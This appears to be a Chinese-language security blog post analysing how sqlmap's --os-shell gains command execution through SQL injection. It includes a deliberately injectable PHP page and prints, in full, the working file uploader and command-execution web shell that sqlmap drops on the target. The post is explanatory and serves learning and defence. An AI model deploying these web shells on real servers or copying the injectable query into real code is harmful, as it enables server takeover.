---
layout: post
title: Sqlmap --os-shell Principle analysis
date: 2018-9-26
categories: blog
tags: [WEB]
description: 文艺的流氓。
---

### 1.环境

**刚好学习完了二次注入,就想知道`sqlmap`的`get  shell`是怎么实现的。**

我自己写一个页面。很简单

- config.php

```php
<?php 
 $serve = '127.0.0.1:3306';
 $user = 'root';
 $password = '';
 $db = 'test';
 $mysql = new Mysqli($serve,$user,$password,$db);
 $mysql->set_charset('utf-8');
?>
```

- sql.php

```php
<?php
 include "config.php";
 $id = @$_GET['id'];
 $sql = "select * from demo where id = '{$id}'";
 $row = $mysql->query($sql);
 if($row){
    $rows = $row->fetch_array();
    echo $rows['username']."<br />";
    echo $rows['password']."<br />";
    echo $rows['email']."<br />";
 }
?>
```

### 2.流程

**第一步**

我已经成功的利用注入点进行了`getshell`。

从图中可以看得到。

1. 我是选择是`php`.因为使用的语言就是`php`
2. 选择了一个绝对路径。
3. 发现了上传了两个文件分别是`tmpuigbp.php`和`tmpbesbw.php`

![](https://wujinlin-blog.oss-cn-beijing.aliyuncs.com/img/20190926093832.png)

**流量分析**

我是通过`wireshark`抓取`sqlmap`的流量来观察的。

![](https://wujinlin-blog.oss-cn-beijing.aliyuncs.com/img/20190926094504.png)

发现`sqlmap`按路径尝试去访问文件`tmpujqbu.php`，通过 POST 上传后门文件`tmpbzhga.php`

**文件内容**

![](https://wujinlin-blog.oss-cn-beijing.aliyuncs.com/img/20190926094813.png)

可以看的到的是`tmpuigbp.php`文件内容就是一个文件上传。并且把文件给了`755`权限

```php
<?php 
if (isset($_REQUEST["upload"])) {
    $dir = $_REQUEST["uploadDir"];
    if (phpversion() < '4.1.0') {
        $file = $HTTP_POST_FILES["file"]["name"];
        @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"], $dir . "/" . $file) or die;
    } else {
        $file = $_FILES["file"]["name"];
        @move_uploaded_file($_FILES["file"]["tmp_name"], $dir . "/" . $file) or die;
    }
    @chmod($dir . "/" . $file, 0755);
    echo "File uploaded";
} else {
    echo "<form action=" . $_SERVER["PHP_SELF"] . " method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=D:\\Software\\xampp\\htdocs\\> <input type=submit name=upload value=upload></form>";
}
?>
```

而`tmpbesbw.php`文件就是一个木马文件了。一个用于执行系统命令的后门脚本文件

```php
<?php
$c = $_REQUEST["cmd"];
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time', 0);
$z = @ini_get('disable_functions');
if (!empty($z)) {
    $z = preg_replace('/[, ]+/', ',', $z);
    $z = explode(',', $z);
    $z = array_map('trim', $z);
} else {
    $z = array();
}
$c = $c . " 2>&1\n";
function f($n)
{
    global $z;
    return is_callable($n) and !in_array($n, $z);
}
if (f('system')) {
    ob_start();
    system($c);
    $w = ob_get_contents();
    ob_end_clean();
} elseif (f('proc_open')) {
    $y = proc_open($c, array(array(pipe, r), array(pipe, w), array(pipe, w)), $t);
    $w = NULL;
    while (!feof($t[1])) {
        $w .= fread($t[1], 512);
    }
    @proc_close($y);
} elseif (f('shell_exec')) {
    $w = shell_exec($c);
} elseif (f('passthru')) {
    ob_start();
    passthru($c);
    $w = ob_get_contents();
    ob_end_clean();
} elseif (f('popen')) {
    $x = popen($c, r);
    $w = NULL;
    if (is_resource($x)) {
        while (!feof($x)) {
            $w .= fread($x, 512);
        }
    }
    @pclose($x);
} elseif (f('exec')) {
    $w = array();
    exec($c, $w);
    $w = join(chr(10), $w) . chr(10);
} else {
    $w = 0;
}
print "<pre>" . $w . "</pre>";
```

访问这个文件。用参数`cmd`执行命令

![](https://wujinlin-blog.oss-cn-beijing.aliyuncs.com/img/20190926095227.png)

**原理简述**

1. 就是一个简单的上传`shell`
2. 分两个文件上传。其实可以一个文件上传
3. 使用`os-shell`的条件就是需要`FILE`权限.可写的一个环境。`PHP GPC off`
4. `os-shell`退出之后。会自动清楚这两个文件